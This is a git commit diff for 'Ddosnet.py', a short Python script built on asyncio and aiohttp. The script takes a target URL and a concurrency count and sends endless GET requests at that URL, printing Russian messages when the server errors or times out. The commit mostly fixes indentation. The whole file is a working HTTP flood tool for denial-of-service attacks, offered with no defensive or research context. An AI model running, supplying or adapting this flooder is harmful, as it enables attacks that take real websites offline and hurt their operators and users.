e0b661d5b1da3880db822e5a0166d7de147edf82
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-31 23:04:37 +0300

    Update Ddosnet.py

--- Ddosnet.py
+++ Ddosnet.py
@@ -1,54 +1,85 @@
+
 import asyncio, aiohttp, argparse
 
-
-
+parser = argparse.ArgumentParser()
+parser.add_argument("url", type=str)
+parser.add_argument("--concurrency", default=16, type=int)
 parser.add_argument("--timeout", default=5, type=int)
-
 args = parser.parse_args()
 
-
 async def send_request(url):
-
-while True:
-
-try:
-
-async with session.get(url) as resp:
-
-if resp.status != 200:
-
-print('Ошибка сервера')
-
-except aiohttp.client_exceptions.ServerTimeoutError:
-
-print('таймаут')
-
+    while True:
+        try:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    print('Ошибка сервера')
+        except aiohttp.client_exceptions.ServerTimeoutError:
+            print('таймаут')
 
 async def main():
+    global session
+    session = aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(args.timeout)
+    )
 
-global session
+    tasks = [
+        send_request(args.url)
+        for i
+        in range(args.concurrency)
+    ]
+    await asyncio.gather(*tasks)
 
-session = aiohttp.ClientSession(
-
-timeout=aiohttp.ClientTimeout(args.timeout)
-
-)
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
 
 
-tasks = [
 
-send_request(args.url)
 
-for i
 
-in range(args.concurrency)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ]
 
-await asyncio.gather(*tasks)
 
 
-loop = asyncio.get_event_loop()
 
-loop.run_until_complete(main())
+
+
+
 
